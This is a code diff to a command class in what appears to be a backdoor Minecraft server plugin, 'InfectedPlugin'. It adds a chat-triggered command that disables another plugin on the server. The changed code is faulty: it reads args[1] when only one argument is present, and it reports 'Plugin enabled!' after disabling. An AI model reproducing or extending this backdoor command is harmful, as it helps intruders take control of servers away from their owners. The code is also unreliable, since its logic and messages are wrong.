@@ -3,7 +3,7 @@ package org.CreeperCoders.InfectedPlugin.Commands;
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
-import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.*;
 import org.bukkit.entity.Player;
 import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
@@ -34,12 +34,11 @@ public class Command_disableplugin implements Listener
                 }
                 else if (args.length == 1)
                 {
-                    Plugin target = server.getPluginManager().getPlugin(args[0]);
+                    Plugin target = server.getPluginManager().getPlugin(args[1]);
                     if (target != null)
                     {
-					    /* Commented this until fixed The method getPluginManager() in type Server is not applicable for the arguments (String)
-                        server.getPluginManager(args[1]).disablePlugin(target);
-					    */
+                        PluginManager pluginManager = plugin.getServer().getPluginManager();
+                        pluginManager.disablePlugin(target);
                     }
                     p.sendMessage(ChatColor.AQUA + "Plugin enabled!");
                 }
